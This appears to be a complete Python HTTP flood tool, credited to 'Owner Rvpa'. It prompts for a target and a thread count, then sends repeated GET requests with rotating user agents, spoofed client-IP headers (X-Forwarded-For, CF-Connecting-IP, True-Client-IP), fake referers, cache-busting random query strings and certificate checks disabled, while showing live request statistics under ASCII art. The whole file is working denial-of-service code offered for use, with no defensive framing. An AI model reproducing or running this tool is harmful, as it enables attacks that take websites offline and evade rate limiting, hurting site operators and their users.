#!/usr/bin/env python3
import sys
import os
import time
import random
import string
import threading
import socket
import ssl
import urllib.request
import urllib.parse
from datetime import datetime

ascii_art = """⠀⠀⠀⠀⠀⠀⢀⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣰⠟⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡻⣧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣰⡇⢰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣇⠘⣧⠀⡀⠀⠀
⠀⠀⠀⣰⡏⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⢸⣧⠀⠀⠀
⠀⠀⢰⠃⢸⠄⠘⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇⠀⢾⠈⣧⠀⠀
⠀⠀⢸⡄⢸⣄⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠀⢀⡏⢀⣟⠀⠀
⠀⢠⠿⡇⠈⣿⡀⠀⠻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠁⠀⣽⠇⢀⡟⡆⠀
⠀⢸⠀⢻⠂⠸⣷⡀⠀⠙⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠀⢀⣼⡟⠀⡺⠀⣹⠀
⠀⣼⡃⢸⣷⠄⢹⣿⣆⠸⣏⠳⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⢡⡇⢀⣿⣯⠀⣴⡗⠀⣿⡀
⢸⡇⢷⣄⠹⣷⣬⣿⣿⡛⠻⣆⠀⠙⠢⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡴⠚⠁⢀⡿⠛⣻⡿⢡⣼⠟⢀⡼⠁⡇
⠀⢳⡀⣷⣄⡸⣿⣮⣿⣷⡀⠙⣶⣄⠀⠈⠑⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠁⠀⣀⣴⠏⠀⣾⣿⣥⣿⠏⣀⣼⠁⡼⠃
⠀⠈⣯⠈⢿⣦⡘⣿⡄⠙⢦⣀⢽⣿⣿⠶⠄⠀⠹⡄⠀⠀⠀⠀⠀⠀⠀⠀⢠⡞⠁⠠⠶⣾⣿⡿⢁⡴⠛⢁⣼⠁⣴⡿⠋⣸⠇⠀
⠀⠀⢸⠻⣆⠙⣿⣿⣿⣆⠀⢻⣷⣾⣿⣅⠀⠀⠀⣱⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⢀⣽⣷⣾⡟⠀⢀⣾⣿⣿⠋⣐⡾⣻⠀⠀
⠀⠀⠈⢧⡈⢿⣬⣽⣿⣉⠙⢲⣮⣽⡇⠀⠀⢀⡞⠃⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡆⠀⠀⢰⣿⣵⡶⠚⢉⣹⣟⣡⣼⠏⣠⠃⠀⠀
⠀⠀⠀⠘⢷⣄⡉⠻⣿⣿⣥⣤⣿⣿⣿⡋⠀⠈⠳⣄⡀⠀⠀⠀⠀⠀⠀⠀⣠⠾⠃⠀⢘⣿⣿⣿⣤⣤⣿⣿⠟⠋⣀⡴⠏⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠙⠒⢬⡿⠋⠀⠀⣘⣿⣷⡟⠀⠀⠀⢳⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⢘⣾⣿⣇⡀⠀⠈⢻⡯⠔⠚⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠷⢤⡞⠉⠀⣩⣿⣿⣾⠀⠀⠈⢣⠀⠀⠀⠀⣰⠃⠀⡀⢻⣿⣿⣯⡀⠉⠓⡦⠽⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣷⣠⠞⠁⣰⠻⣿⣿⡧⠤⢌⣱⠄⠀⢾⡁⠤⢤⡿⣿⠟⢧⠀⠙⣦⣾⡗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣶⣦⣧⣤⣏⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⣜⣧⣬⣧⣶⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⢉⡉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"""

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Android 14; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0",
]

accept_headers = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "*/*",
]

referers = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.reddit.com/",
    "https://www.twitter.com/",
    "https://www.instagram.com/",
    "https://www.linkedin.com/",
    "https://www.wikipedia.org/",
]

def random_string(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def build_request(target, path):
    ua = random.choice(user_agents)
    accept = random.choice(accept_headers)
    referer = random.choice(referers)
    xff = random_ip()
    cf_ip = random_ip()
    
    headers = {
        "User-Agent": ua,
        "Accept": accept,
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-User": "?1",
        "Cache-Control": "max-age=0",
        "Referer": referer,
        "X-Forwarded-For": xff,
        "CF-Connecting-IP": cf_ip,
        "X-Real-IP": cf_ip,
        "True-Client-IP": cf_ip,
        "X-Requested-With": "XMLHttpRequest",
        "DNT": "1",
        "Pragma": "no-cache",
    }
    
    query = "?" + random_string(8) + "=" + random_string(16) if random.random() > 0.5 else ""
    url = target + path + query
    
    req = urllib.request.Request(url, headers=headers, method="GET")
    return req

def flood_worker(target, path, delay, stats):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    
    while stats["running"]:
        try:
            req = build_request(target, path)
            req.add_header("X-Custom-Header", random_string(32))
            
            opener = urllib.request.build_opener(
                urllib.request.HTTPSHandler(context=ctx)
            )
            
            start = time.time()
            resp = opener.open(req, timeout=10)
            code = resp.getcode()
            stats["success"] += 1
            stats["codes"][code] = stats["codes"].get(code, 0) + 1
            
        except urllib.error.HTTPError as e:
            stats["codes"][e.code] = stats["codes"].get(e.code, 0) + 1
            stats["success"] += 1
        except:
            stats["failed"] += 1
        
        if delay > 0:
            time.sleep(delay)

def print_status(stats, target):
    while stats["running"]:
        time.sleep(1)
        s = stats["success"]
        f = stats["failed"]
        t = s + f
        rps = s - stats.get("last_s", 0)
        stats["last_s"] = s
        
        os.system("cls" if os.name == "nt" else "clear")
        print(ascii_art)
        print(f"\n{'='*60}")
        print(f"  TARGET    : {target}")
        print(f"  STATUS    : {'RUNNING' if stats['running'] else 'STOPPED'}")
        print(f"  TOTAL REQ : {t}")
        print(f"  SUCCESS   : {s}")
        print(f"  FAILED    : {f}")
        print(f"  RPS       : {rps}/s")
        print(f"  CODES     : {dict(stats['codes'])}")
        print(f"{'='*60}")
        print(f"\n  Owner Rvpa")
        print(f"  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

def main():
    os.system("cls" if os.name == "nt" else "clear")
    print(ascii_art)
    print("\n")
    
    threads = int(input("  Thread  : "))
    target = input("  Target  : ").strip()
    
    if not target.startswith("http"):
        target = "https://" + target
    
    parsed = urllib.parse.urlparse(target)
    if not parsed.path:
        target = target + "/"
    
    delay = 1.0
    
    stats = {
        "success": 0,
        "failed": 0,
        "codes": {},
        "running": True,
        "last_s": 0,
    }
    
    print(f"\n  [+] Threads : {threads}")
    print(f"  [+] Target  : {target}")
    print(f"  [+] Delay   : {delay}s")
    print(f"  [+] Starting...\n")
    time.sleep(1)
    
    for _ in range(threads):
        t = threading.Thread(target=flood_worker, args=(target, "/", delay, stats))
        t.daemon = True
        t.start()
    
    status_thread = threading.Thread(target=print_status, args=(stats, target))
    status_thread.daemon = True
    status_thread.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        stats["running"] = False
        print("\n  [+] Stopping...")
        time.sleep(1)

if __name__ == "__main__":
    main()
